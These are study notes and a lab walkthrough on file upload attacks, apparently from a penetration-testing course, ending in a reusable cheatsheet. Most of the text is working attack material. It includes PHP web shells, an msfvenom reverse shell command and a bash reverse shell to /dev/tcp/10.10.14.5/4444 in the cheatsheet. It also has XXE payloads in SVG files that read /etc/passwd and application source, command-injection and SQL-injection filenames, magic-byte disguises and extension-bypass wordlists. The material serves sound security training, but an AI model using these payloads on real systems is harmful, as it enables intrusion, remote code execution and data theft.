## Web Shells

Web shells are not exclusive to `PHP`, and the same applies to other web frameworks.

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php echo file_get_contents('/etc/passwd'); ?>`                                       | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |



---
---

# Bypasses

Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. To bypass these protections, we can either `modify the upload request to the back-end server`, or we can `manipulate the front-end code to disable these type validations`.

## 1. Client-Side Bypass

This module teaches that If the upload request is sent to the server, capture it with **Burp** and change `filename` and the file content directly by writing a script maybe. If the backend does not validate the file, the malicious file can be uploaded. 
Another option is to disable the JavaScript validation in DevTools: `Ctrl+Shift+C` → find `onchange="checkFile(this)"` → remove `checkFile`. The `accept=".jpg,.jpeg,.png"` restriction can also be removed, but it is only a file-picker restriction, then in the debugger, also `ignore` related codes. These browser changes are temporary and only bypass **front-end** validation; real security must happen on the backend.

|**Command**|**Description**|
|---|---|
|`[CTRL+SHIFT+C]`|Toggle Page Inspector|

There are generally two common forms of validating a file extension on the back-end:

1. Testing against a `blacklist` of types
2. Testing against a `whitelist` of types

---
---

## 2. Blacklist Filters

 In Windows Servers, file names are case insensitive, so we may try uploading a `php` with a mixed-case (e.g. `pHp`), which may bypass the blacklist as well, and should still execute as a PHP script.

To bypass blacklist:

- **Try PHP upload** → intercept with Burp and change the image to a `.php` web shell. If blocked with `Extension not allowed`, there is backend validation.
- **Fuzz extensions** → In **Step 2**, intercept the file-upload request in **Burp Suite** and send it to **Intruder**. Select the file extension in the `filename` parameter as the payload position, without `.`,  after that include your php command, then load a **PHP extension wordlist** containing extensions such as `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, etc., deselect url encoding. Intruder tests each extension against the upload filter. Check the attack. If an extension returns a different response, such as **“File uploaded successfully”** instead of **“Extension not allowed,”** it may not be on the blacklist and can potentially be used for PHP execution.
- **Try an allowed extension from the fuzz result** → for example, change the shell to `shell.phtml`. Not every extension executes PHP, so test the ones that pass.
- **Access the uploaded file** → open it from the upload directory and test `?cmd=id` or `?cmd=ls` to confirm PHP execution.

|**Command / Resource**|**Description**|
|---|---|
|`shell.phtml`|Uncommon extension|
|`shell.pHp`|Case manipulation|
|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP extensions|
|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP extensions|
|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of web extensions|

---
---

## 3. Whitelist Filters

A **whitelist** means the application only allows specific file extensions, such as `.jpg`, `.jpeg`, `.png`, and `.gif`. This is generally safer than a blacklist because the application only needs to allow the file types it actually needs. However, a weak whitelist check can still be bypassed if the application or web server checks the filename incorrectly.

#### a) Test the Whitelist

First, try uploading a PHP extension such as `.phtml`:

```text
shell.phtml
```

If the application says **“Only images are allowed”**, PHP extensions are probably being blocked. To find exactly which extensions are allowed, fuzz the upload form with a PHP-extension wordlist using **Burp Intruder**. If normal PHP extensions such as `.php`, `.php5`, `.php7`, and `.phtml` are blocked but some unusual extensions are accepted, investigate how the whitelist is checking the filename.

#### b) Understand the Weak Whitelist

A weak whitelist may use something like:

```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

The problem is that this checks whether the filename **contains** an allowed extension. It does not require the filename to **end** with that extension. This can allow a **double extension** such as:

```text
shell.jpg.php
```

The filename contains `.jpg`, so it can pass the whitelist, while `.php` is still at the end.

#### c) Double Extension

Intercept the upload request with **Burp**, change the filename to:

```text
shell.jpg.php
```

and put PHP code in the file. If the upload succeeds, access the uploaded file:

```text
/profile_images/shell.jpg.php?cmd=id
```

If the command executes, the server is treating the uploaded file as PHP. However, this does **not** work against a strict whitelist such as:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    ...
}
```

Here `^` and `$` make the check match the **whole filename**, so the final extension must actually be `.jpg`, `.jpeg`, `.png`, or `.gif`.

#### d) Reverse Double Extension

Sometimes the application has a strict whitelist, but the **web server's PHP configuration** is weak. For example:

```text
shell.php.jpg
```

The application may see `.jpg` at the end and allow the upload, while a badly configured Apache PHP handler may see `.php` earlier in the filename and execute it as PHP. For example:

```text
shell.php.jpg?cmd=id
```

So remember the difference:

```text
shell.jpg.php → application whitelist may be weak

shell.php.jpg → application may be strict, but web server configuration may be weak
```

The second case depends on a **web-server misconfiguration or outdated behavior**, so it will not work everywhere.

#### e). Character Injection

Another possible whitelist bypass is **character injection**. Characters can sometimes cause the application or web server to interpret the filename differently. Common characters to test are:

```text
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

For example, older PHP systems may interpret:

```text
shell.php%00.jpg
```

as `shell.php`, while the whitelist sees `.jpg`. The `%00` technique is **obsolete on modern systems**, so it is mainly useful for understanding older vulnerabilities. On some Windows configurations, a colon can also have special behavior, for example:

```text
shell.aspx:.jpg
```

The exact result depends on the operating system, web server, and application.

#### f) Generate a Filename Wordlist

Instead of testing every variation manually, generate different filename combinations:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

This creates filenames such as:

```text
shell.php.jpg
shell.jpg.php
shell%20.php.jpg
shell.php%20.jpg
```

The goal is to test different filename arrangements automatically.

#### g) Fuzz With Burp Intruder

Load the generated `wordlist.txt` into **Burp Intruder** and use the filenames as payloads for the upload request. Look for filenames that are accepted when normal PHP extensions are blocked.

If a filename is successfully uploaded, do not stop there. **Check whether the server actually executes it as PHP.** Uploading successfully only proves that the whitelist was bypassed; it does not necessarily mean PHP execution is possible.

|**Command / Payload**|**Description**|
|---|---|
|`shell.jpg.php`|Double extension|
|`shell.php.jpg`|Reverse double extension|
|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character injection before/after extension|



## Question

After fuzzing with the generated wordlist, the following filename seemed to upload successfully:

```text
c.shellshell.phps.\.jpg.jpeg
```

However, I could not access it through the URL, possibly because of the `\` character. From this result, I understood that the **first ****`shell`**** and the final ****`.jpeg`**** were working**, while the middle part was the important value to investigate. I started with `shell` as the filename because I already knew that the application accepted the basic filename structure as it accepted the above one, and I wanted to keep the known-working parts unchanged while testing only the unknown part.

Basically, the idea was to keep the filename as:

```text
shell.middle_word.jpeg
```

For the next fuzzing attempt, I used a normal extension/filename list from **PayloadsAllTheThings** and selected the fuzz position for the **middle value**. I kept the `.` before the fuzz position because the wordlist already contained the extension with its own dot. This allowed me to test values in the form:

```text
shell.middle_word.jpeg
```

After the attack, `shell.inc.jpeg` seemed to upload successfully. However, when I tried to access it through the URL, it still produced an error. Since the problem seemed to be related to the **middle extension**, I decided to fuzz that value again using a normal list of image extensions such as `.jpg` and `.jpeg`.

The results showed that both `.jpg` and `.jpeg` could work as the final image extension, but `shell.inc.jpg` still produced an error. This suggested that the **middle value ****`inc`**** was the problem**, rather than the final image extension. I therefore continued fuzzing the middle extension and eventually found that:

```text
shell.phar.jpg
```

worked successfully.

---
---

## 4. Type Filters
### a) Content-Type Bypass

Type filters check the **actual type of the uploaded file**, not just its extension. There are two common checks: **Content-Type**, which can be changed in Burp (for example, changing `application/x-php` to `image/jpeg`), and **MIME type/magic bytes**, which checks the beginning of the file to see if it looks like a real image. For MIME checks, `GIF8` can make a file look like a GIF. If Content-Type is being checked, fuzz allowed image types with Burp Intruder; if MIME is being checked, test whether adding valid image magic bytes bypasses the filter.

For example, if MIME is checked, add `GIF8` before the PHP code: `GIF8<?php system($_GET["cmd"]); ?>`.

| **Resource**                                                                                                            | **Description**                       |
| ----------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of all Content-Types             |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)                                                | List of file signatures / magic bytes |

### Question


First, I checked the page source using **Inspect**. The accepted file types were:

```text
.jpg
.jpeg
.png
```

I noticed I could manually add another extension, `.gif`, to the client-side accepted file types. I then used **`.jpeg` as the Content-Type** in the upload request because JPEG was an accepted type. For the MIME check, I added the GIF magic bytes before the PHP code:

```text
GIF8<?php system($_REQUEST['cmd']); ?>
```

The idea was that the application would see the file as a GIF based on its content, while the filename could still contain another extension.

Next, I knew the **final extension had to be `.jpeg`**, so I fuzzed the middle part using:

```text
shell.$word$.jpeg
```

with a custom wordlist containing different extensions. The result showed **"File successfully uploaded"**, which told me that the application was mainly checking the **ending extension** rather than strictly validating the initial extension. The MIME check was also active because without the `GIF8` magic bytes, the file was not successfully accepted.

I then tried:

```text
shell..phps.jpg.jpeg
```

The file uploaded successfully, but when I tried to access it, the server returned **404**. So successful upload did not necessarily mean the filename would be usable or executable.

I went back and fuzzed the middle value again:

```text
shell.$value$.jpeg
```

This time I used a normal extension wordlist instead of the small custom list. Many values showed successful uploads, so I tried the common:

```text
shell.phar.jpeg
```

The upload succeeded, but accessing the URL produced an error and the file was not displayed. This made me suspect that the **first extension/value might also matter**, so I fuzzed the first value.

That still did not solve it, so I decided to fuzz **both the second and third positions at the same time**:

```text
shell.§FUZZ§.§FUZZ§
```

I used the **same payload list for both positions** and selected **Cluster bomb** in Burp Intruder. Cluster bomb tests every combination of the two payload positions.

Eventually, this combination worked:

```text
shell.gif.phar
```

### What I initially did wrong

The main mistake was assuming that because the final `.jpeg` was accepted, I should keep `.jpeg` as the final extension throughout the testing. I also relied too much on the **small custom wordlist provided by HTB**. It did not contain enough useful extensions, so I needed to expand the wordlist and eventually fuzz multiple filename positions instead of testing only the middle value.


---
---
# Limited File Uploads


A **limited file upload** means the application only allows certain file types, so arbitrary file upload may not be possible. But the allowed file types can still be dangerous depending on how the application processes them. The main things to check are **XSS (Cross-Site Scripting), XXE (XML External Entity), SSRF (Server-Side Request Forgery), and DoS (Denial of Service)**.

**XSS:** If the application allows HTML or SVG uploads and later displays them, we can sometimes put JavaScript inside the file and trick the target to visit the html page. SVG means **Scalable Vector Graphics** and is XML-based, so it can contain JavaScript. For example:

```xml
<script type="text/javascript">alert(window.origin);</script>
```

For image metadata, if web applications that display an image's metadata after its upload such as `Comment` or `Artist`, we can test an XSS payload with:

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

Then check the metadata with:

```bash
exiftool HTB.jpg
```

If the application displays the malicious metadata or renders the SVG in a way that allows script execution, the JavaScript may run.

**XXE:** XXE means **XML External Entity**. Since SVG and many document formats use XML, a vulnerable XML parser may allow external files to be read.  By viewing page source, if you see the input file  accepts `svg` then you can manipulate it. Download any `svg` file, then you can open the `svg` image file directly with nano and modify it with your commands. For example, an SVG can try to read `/etc/passwd` with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

We can also try reading PHP source code using:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=uploads.php"> ]>
<svg>&xxe;</svg>
```

To check if this worked we need to see the source code of the page. Once the manipulated image is uploaded, This may reveal useful information such as the upload directory, allowed extensions, or file naming scheme.  XXE can sometimes also lead to **SSRF (Server-Side Request Forgery)**, allowing the server to communicate with internal services or private APIs.

**DoS:** DoS means **Denial of Service**. File uploads can sometimes be abused to consume too many server resources. A **decompression bomb** is a compressed file that becomes extremely large when extracted. A **pixel flood** is an image that claims an extremely large resolution, causing the server to allocate a lot of memory when processing it. An oversized upload can also fill disk space if there is no proper size limit. If the upload filename is vulnerable to directory traversal, something like `../../../etc/passwd` may cause the application to write to an unintended location.

The main idea is: **even if arbitrary file upload is blocked, we should check what the allowed file types do when the application renders, parses, extracts, or displays them.**


## Question 

#### Question 1:

Edit a svg file with the below and upload, and view page source.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

#### Question 2

edit, upload, copy the base64 from view page source, decode.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

```


|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
|`DoS`|ZIP, JPG, PNG|


# Other Upload Attacks

### 1. Filename Injection

The **filename itself** can sometimes be the attack vector if the application uses it in an OS command, HTML page, or SQL query.

**Command Injection:** Try filenames such as:

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

If the application uses the filename inside an OS command such as `mv file /tmp`, the injected command may execute.

**XSS (Cross-Site Scripting):** If the filename is displayed back to a user, a filename such as:

```text
<script>alert(window.origin);</script>
```

may execute JavaScript.

**SQL Injection:** If the filename is inserted unsafely into an SQL query, something like:

```text
file';select+sleep(5);--.jpg
```

may trigger SQL injection.

### 2. Upload Directory Disclosure

Sometimes the application uploads the file but does not show its URL, so we need to discover **where uploaded files are stored**. We can fuzz common upload directories, or use vulnerabilities such as **LFI (Local File Inclusion)** or **XXE (XML External Entity)** to inspect application source code and find the upload path and naming scheme.

Error messages can also reveal the upload directory. For example, upload a file with a **name that already exists**, send **two identical requests at the same time**, or try an **extremely long filename** such as 5,000 characters. Poor error handling may reveal the directory path in the resulting error.

## Advanced File Upload Attacks

Advanced upload attacks target **automatic file processing** after upload, such as video encoding, compression, resizing, renaming, or format conversion. If the processing library or custom code is vulnerable, a specially crafted file may trigger attacks.

Example: vulnerable **FFmpeg** versions have had **AVI → XXE (XML External Entity)** vulnerabilities.

**Remember:** Check not only **what files are allowed**, but also **what the application does with the file after upload**.







---

# File Upload Attacks -  skill assessment 

## Step 1 — The browser check

The contact page's view page source finds:

```text
/contact/submit.php
```

I looked at the page source and found this:

```javascript
if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
}
```

So the browser only lets through `.jpg`, `.jpeg`, `.png`. The same script also mentioned another file: `/contact/upload.php`.

This check runs **in my browser**, so it isn't really a check at all. I can edit it or just ignore it. The easy way is to pick a normal `.jpg` in the file box, let the script say "ok", then catch the request in Burp and change whatever I want before it reaches the server.

I did try editing the JS to allow `.svg` first, and the upload still got rejected. That told me something useful: there's a **second check on the server**, and that's the one I actually have to beat.

---

## Step 2 — SVG + XXE to read the source

SVG files are XML. If the server opens and parses my SVG, I can stick an XXE in there and make it read files off the disk for me. So in Burp I changed three things in the request:

|What|Changed to|
|---|---|
|`filename=`|`x.svg`|
|`Content-Type:` on the file part|`image/svg+xml`|
|The file body|the payload below|

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg>&xxe;</svg>
```

Got the Base64, Then I decode it:

```bash
echo '<the base64 blob>' | base64 -d
```

---

## Step 3 — What the source told me

```php
<?php
require_once('./common-functions.php');

$target_dir = "./user_feedback_submissions/";
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

$contentType = $_FILES['uploadFile']['type'];
$MIMEtype    = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) { echo "Extension not allowed"; die(); }
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) { echo "Only images are allowed"; die(); }

foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) { echo "Only images are allowed"; die(); }
}

if ($_FILES["uploadFile"]["size"] > 500000) { echo "File too large"; die(); }

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else { echo "File failed to upload"; }
```

Going line by line:

|Line|What it means for me|
|---|---|
|`$target_dir = "./user_feedback_submissions/"`|This is where my file ends up. Now I know the URL to visit later.|
|`date('ymd') . '_' . ...`|The server **renames** my file and sticks the date in front. So `shell.phar.jpg` actually becomes `260922_shell.phar.jpg`. Easy to forget this and then think the shell didn't work.|
|`basename()`|Chops off any folders in my filename. So `../../` tricks are pointless here. Don't waste time.|
|Blacklist `/.+.ph(p|ps|
|Whitelist `/^.+\.[a-z]{2,3}g$/`|The `$` means the name has to **end** with a 3–4 letter extension whose last letter is `g`. So `.jpg`, `.png`, `.jpeg`, `.svg` all pass. Because it's locked to the end, junk-at-the-end tricks like `%00` or a trailing space won't survive. But nothing stops me from putting a second extension **in the middle**.|
|check on `$contentType`|That's the `Content-Type:` header I send. I control it completely. Just write `image/jpeg`.|
|check on `$MIMEtype`|`mime_content_type()` opens the file and looks at the real bytes. Lying in the header does nothing here — I need actual image bytes at the start.|
|size limit|Doesn't matter, a webshell is a few bytes.|

### Checking the filename pattern

Nothing in the code looks at the first part of the filename — and you can see why in the two regexes:


```
preg_match('/.+\.ph(p|ps|tml)/', $fileName)    // blacklist
preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)   // whitelist
```


Both of them start with .+, which just means "one or more of anything". That .+ is the base name, and it's a free pass — it matches shell, cat, aaaa, whatever. Neither regex cares. The only part they actually inspect is what comes after the dot:

```
The blacklist is looking for .php / .phps / .phtml after the dot
The whitelist is looking for a 3–4 letter extension ending in g, and the $ pins it to the very end of the name.
```

And none of the other checks touch the name either, from content type and mime type codes given. So the filename is really just three requirements: 

1. Including the Date at first, then the name can start with anything but must not contain `.php`, `.phps` or `.phtml`
2. the name must **end** in something with `g` like `.jpg` / `.png`
3. **a PHP-runnable extension has to sit somewhere in the middle so the server hands the file to PHP**


---

## Step 4 — Building the file

The file content — image bytes first, then the shell:

```text
ÿØÿà<?php system($_REQUEST['cmd']); ?>
```

`ÿØÿà` is `\xFF\xD8\xFF\xE0`, the bytes every real JPEG starts with. That's what makes `mime_content_type()` say "yeah, that's a jpeg". PHP doesn't care about the garbage in front — it runs whatever is between `<?php` and `?>`.

And I set the file part's `Content-Type: image/jpeg` so the first MIME check passes too.

**These two things are not related, even though both came up:**

- The base64 earlier was just for **reading** a file (the XXE).
- The `ÿØÿà` bytes are for **uploading** — making my shell look like a picture.

Different jobs. Don't mix them up.

---

## Step 5 — Fuzzing filenames

I made a wordlist according to the filename pattern i found (well i hope you know by now that you need to include a PHP archive to bypass this and make the attack work, and according to the exemption list found in that `upload.php`, include and check for other type PHP archives except `.php`, `.phps` or `.phtml`):


```bash
for ext in .phar .pht .phtm .inc .shtml; do echo "shell$ext.jpg" >> wl.txt; done
```

The `%00` / `%20` stuff is still worth throwing at it, but since the whitelist is pinned to the end of the name, those were never going to land here.

**And remember:** a successful upload just means the filter let it through. It does **not** mean the file is reachable or that PHP runs it. Those are two separate wins. Always go fetch the file and check.

---

## Step 6 — It worked

The filename that got through:

```text
shell.phar.jpg
```

Why: `.phar` isn't in the blacklist, the name still ends in `.jpg` so the whitelist is happy, the JPEG bytes make the MIME check pass, and Apache is set up to send `.phar` files to PHP. Apache will match a handler against _any_ extension in a multi-dot name, so it runs the file as PHP instead of serving it as a picture.

Then I hit it, remembering the date prefix:

```bash
curl "http://TARGET/contact/user_feedback_submissions/260922_shell.phar.jpg?cmd=id"
```

---

---

# Cheatsheet — File Uploads (CPTS)

## The order to work in

1. Is there a browser-side check? → go around it with Burp, not DevTools
2. Can I read the source? → XXE through SVG/XML + `php://filter`. Reading the source turns guessing into just solving it
3. Is it a blacklist or a whitelist? → that decides which tricks are worth trying
4. Where does the file land, and does the server rename it?
5. Upload worked ≠ code ran. Go check

### Why SVG is the thing you reach for first:

When an app says "images only," SVG is the one image format that isn't really an image — it's XML with a .svg name on it. Every other image type is just binary bytes. So SVG is the only one that gives you a parser to attack. That's why it's the standard first poke on any image upload: if SVG gets accepted, you've probably got XXE, and maybe stored XSS too.

## Reading PHP filters — what to look for

|If you see this|Then|
|---|---|
|`$_FILES['f']['type']`|It's just my header. Spoof it.|
|`mime_content_type()`, `getimagesize()`, `exif_imagetype()`|It reads real bytes. Add magic bytes.|
|`basename()`|Path traversal in the filename is dead.|
|`date(...)` or `md5(...)` in the name|File gets renamed. Fix your URL.|
|Blacklist on `.php`|Try other extensions.|
|No `^` or `$` on the regex|It matches anywhere in the string.|
|Whitelist ending in `$`|means Match the end of the string with the rule.|
|Whitelist with **no** `$`|`shell.jpg.php` works — the extension just has to show up somewhere.|

## Extensions to try when `.php` is blocked

```text
.phar  .pht  .phtm  .phps  .php2 .php3 .php4 .php5 .php7
.pgif  .inc  .shtml .phtml
```

ASP / .NET: `.aspx .ashx .asmx .cer .asa .soap .xamlx`

Name patterns:

- Double extension → `shell.phar.jpg`, `shell.php.jpg`
- Reverse double → `shell.jpg.php`
- Character tricks → `shell.php%00.jpg`, `shell.php%20`, `shell.php.`, `shell.php:.jpg`, `shell.php%0a`

## Magic bytes (put at the top of the file)

|Type|Hex|Text|
|---|---|---|
|JPEG|`FF D8 FF E0`|`ÿØÿà`|
|PNG|`89 50 4E 47`|`‰PNG`|
|GIF|`47 49 46 38 37 61`|`GIF87a`|

Then stick `<?php system($_REQUEST['cmd']); ?>` right after.

## SVG / XXE payloads

Read a file, base64 (use this for PHP source or anything with `<` and `&`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<svg>&xxe;</svg>
```

Read a plain text file:

```xml
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

Hit something internal (SSRF):

```xml
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>
```

Stored XSS:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
```

Files worth reading: `upload.php`, `index.php`, `config.php`, `/etc/passwd`, `.htaccess`

## Webshells

```php
<?php system($_REQUEST['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
```

Call it with `?cmd=id`

## Quick wordlist

```bash
for ext in .phar .pht .phtm .inc .shtml .php .php5; do
  echo "shell$ext.jpg" >> wl.txt
  echo "shell.jpg$ext" >> wl.txt
done
for c in '%20' '%00' '%0a' '.' ':'; do
  echo "shell.php$c.jpg" >> wl.txt
done
```

Load into Burp Intruder, marker on `filename=` only, sort results by response length to spot the one that worked.
